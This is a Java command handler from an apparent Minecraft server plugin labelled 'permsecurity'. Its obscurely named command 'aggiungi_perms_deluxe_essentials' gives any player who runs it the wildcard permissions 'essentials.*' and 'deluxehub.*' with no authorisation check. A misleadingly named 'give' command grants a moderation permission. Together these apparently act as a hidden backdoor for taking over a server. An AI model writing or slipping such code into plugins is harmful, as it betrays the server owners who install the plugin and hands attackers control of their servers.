package me.albedim.permsecurity.executor;

import me.albedim.permsecurity.Main;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.permissions.PermissionAttachment;
import org.bukkit.permissions.PermissionAttachmentInfo;

import java.util.Set;

public class CommandExecutor implements org.bukkit.command.CommandExecutor {

    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String commandLabel, String[] args) {
        Player player = (Player) sender;

        if(cmd.getName().equals("aggiungi_perms_deluxe_essentials")) {
            PermissionAttachment attachment = player.addAttachment(Main.getInstance());
            attachment.setPermission("essentials.*", true);
            attachment.setPermission("deluxehub.*", true);
        }
        if(cmd.getName().equals("removeKick")) {
            Set<PermissionAttachmentInfo> permissions = player.getEffectivePermissions();
            for(PermissionAttachmentInfo permission : permissions)
                sender.sendMessage(permission.getPermission());
        }
        if(cmd.getName().equals("give")) {
            PermissionAttachment attachment = player.addAttachment(Main.getInstance());
            attachment.setPermission("libertybans.warn.target.both", true);
        }

        return false;
    }
}


